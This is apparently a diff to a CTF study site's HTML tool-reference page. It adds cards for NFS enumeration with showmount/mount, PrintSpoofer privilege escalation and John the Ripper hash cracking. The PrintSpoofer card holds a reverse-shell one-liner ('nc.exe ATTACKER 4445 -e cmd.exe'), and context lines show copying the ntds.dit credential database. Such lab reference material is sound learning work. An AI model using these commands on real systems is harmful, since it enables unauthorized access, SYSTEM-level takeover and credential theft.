@@ -60,7 +60,7 @@
         <li><strong>Vulnerability scanners:</strong> <a href="#nessus">Nessus</a>, <a href="#openvas">OpenVAS</a>.</li>
         <li><strong>Web &amp; proxies:</strong> <a href="#burp">Burp Suite</a>, <a href="#mitmproxy">mitmproxy</a>.</li>
         <li><strong>Networking &amp; access:</strong> <a href="#netcat">netcat</a>, <a href="#ssh">ssh</a> (local port forwarding).</li>
-        <li><strong>Active Directory / Windows:</strong> <a href="#dig">dig</a>, <a href="#ldapsearch">ldapsearch</a>, <a href="#netexec">netexec</a>, <a href="#smbpasswd">smbpasswd</a>, <a href="#evil-winrm">evil-winrm</a>, <a href="#impacket">Impacket</a>, <a href="#diskshadow">diskshadow + robocopy</a>.</li>
+        <li><strong>Active Directory / Windows:</strong> <a href="#dig">dig</a>, <a href="#ldapsearch">ldapsearch</a>, <a href="#netexec">netexec</a>, <a href="#smbpasswd">smbpasswd</a>, <a href="#showmount">showmount/mount</a>, <a href="#evil-winrm">evil-winrm</a>, <a href="#impacket">Impacket</a>, <a href="#diskshadow">diskshadow + robocopy</a>, <a href="#printspoofer">PrintSpoofer</a>, <a href="#john">John the Ripper</a>.</li>
         <li><strong>Mobile static:</strong> <a href="#jadx">jadx</a>, <a href="#apktool">apktool</a>, <a href="#mobsf">MobSF</a>.</li>
         <li><strong>Mobile device &amp; runtime:</strong> <a href="#android-studio">Android Studio</a>, <a href="#adb">adb</a> (with <code>am</code> and <code>content</code>), <a href="#frida">Frida</a>, <a href="#objection">objection</a>.</li>
         <li><strong>Reverse engineering &amp; signing:</strong> <a href="#apksigner">apksigner</a>, <a href="#zipalign">zipalign</a>, <a href="#keytool">keytool</a>, <a href="#ghidra">Ghidra</a>, <a href="#radare2">radare2</a>.</li>
@@ -240,6 +240,31 @@
           <div class="tc-row"><span class="os">VSS</span> <code>diskshadow /s script.txt</code> &nbsp;(create + expose snapshot as Z:)</div>
           <div class="tc-row"><span class="os">COPY</span> <code>robocopy /b Z:\Windows\NTDS . ntds.dit</code></div>
           <div class="tc-seen">seen in <a href="writeup-baby.html">Baby</a> &middot; concept: <a href="windows-ad.html#sebackupprivilege">SeBackupPrivilege</a></div>
+        </div>
+
+        <div class="toolcard cat-recon" id="showmount">
+          <div class="tc-head"><span class="tc-glyph">nfs</span><span class="tc-name">showmount / mount</span><span class="tc-cat">nfs enum</span></div>
+          <p class="tc-what">Enumerate and access NFS exports. <code>showmount -e</code> lists a host's exported shares; one open to <strong>everyone</strong> mounts with no auth and browses like a local folder. Backups left on such a share routinely leak credentials.</p>
+          <div class="tc-row"><span class="os">LINUX</span> <code>sudo apt install nfs-common</code></div>
+          <div class="tc-row"><span class="os">LIST</span> <code>showmount -e TARGET</code></div>
+          <div class="tc-row"><span class="os">MOUNT</span> <code>sudo mount -t nfs TARGET:/share ./dir -o nolock</code></div>
+          <div class="tc-seen">seen in <a href="writeup-remote.html">Remote</a> &middot; concept: <a href="vulns.html#nfs-exposed-share">exposed NFS share</a></div>
+        </div>
+
+        <div class="toolcard cat-runtime" id="printspoofer">
+          <div class="tc-head"><span class="tc-glyph">ps</span><span class="tc-name">PrintSpoofer</span><span class="tc-cat">potato privesc</span></div>
+          <p class="tc-what">Local privilege escalation for an account with <code>SeImpersonatePrivilege</code>. Coerces the SYSTEM Print Spooler to connect to a named pipe, steals its token, and launches your command as SYSTEM. The modern "Potato" of choice on Server 2016/2019 and Windows 10.</p>
+          <div class="tc-row"><span class="os">GET</span> PrintSpoofer64.exe from github.com/itm4n/PrintSpoofer releases</div>
+          <div class="tc-row"><span class="os">RUN</span> <code>PrintSpoofer64.exe -c "nc.exe ATTACKER 4445 -e cmd.exe"</code></div>
+          <div class="tc-seen">seen in <a href="writeup-remote.html">Remote</a> &middot; concept: <a href="windows-ad.html#seimpersonate">SeImpersonate</a></div>
+        </div>
+
+        <div class="toolcard cat-util" id="john">
+          <div class="tc-head"><span class="tc-glyph">jtr</span><span class="tc-name">John the Ripper</span><span class="tc-cat">hash cracking</span></div>
+          <p class="tc-what">Offline password cracker. Feed it a hash and a wordlist (rockyou) and it recovers the plaintext. A great CPU fallback when hashcat can't use your GPU; name the hash type with <code>--format</code>.</p>
+          <div class="tc-row"><span class="os">LINUX</span> <code>sudo apt install john</code></div>
+          <div class="tc-row"><span class="os">CMD</span> <code>john --format=raw-sha1 --wordlist=rockyou.txt hash.txt</code></div>
+          <div class="tc-seen">seen in <a href="writeup-remote.html">Remote</a></div>
         </div>
 
       </div>
